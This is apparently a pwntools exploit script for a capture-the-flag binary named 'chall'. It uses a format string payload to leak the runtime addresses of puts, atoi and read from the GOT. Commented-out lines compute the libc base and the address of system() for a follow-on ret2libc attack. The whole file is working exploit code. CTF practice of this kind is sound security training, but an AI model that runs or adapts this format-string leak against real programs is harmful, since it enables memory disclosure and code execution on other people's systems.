from pwn import *

binary = ELF("chall")
r = process("./chall")
#gdb.attach(r, api = True)

def send_payload(r, a, b):
    log.info(f"Sending:\nA:\n{a}\nB:\n{hexdump(b)}")
    r.sendlineafter("A: ", a)
    r.sendlineafter("B: ", b)

def send_format(r, format, values):
    format_prefix = b'1_______'
    values_prefix = b'1_______'
    send_payload(r, format_prefix + format, values_prefix + values)
    out = r.recvline()
    arr = out.split(b" and ")
    res = arr[0].replace(b"Calculating for A: " + format_prefix, b"")
    log.info(f"Received:\n{hexdump(res)}")
    return res

log.info(f"puts() GOT address: {hex(binary.got['puts'])}")

# puts_offset_libc = binary.plt['puts']


output = send_format(r, b"%43$s.%44$s.%45$s.", p64(binary.got["puts"]) + p64(binary.got["atoi"])+ p64(binary.got["read"]))

print(output)

puts_addr_str = output.split(b'.')[0].ljust(8, b'\x00')
atoi_addr_str = output.split(b".")[1].ljust(8, b'\x00')
read_addr_str = output.split(b".")[2].ljust(8, b'\x00')

puts_addr = int.from_bytes(puts_addr_str, "little") 
atoi_addr = int.from_bytes(atoi_addr_str, "little") 
read_addr = int.from_bytes(read_addr_str, "little") 

log.info(f"puts() runtime address: {hex(puts_addr)}\n")
log.info(f"atoi() runtime address: {hex(atoi_addr)}\n")
log.info(f"read() runtime address: {hex(read_addr)}\n")

# libc_base_addr = u64(puts_addr_str) - puts_offset_libc
# log.info(f"libc_base address: {hex(libc_base_addr)}\n")

# system_offset = 0x0000000000050d60
# system_addr = libc_base_addr + system_offset
# log.info(f"system address: {hex(system_addr)}\n") # demo 0x7fe0e8abc570

r.interactive()

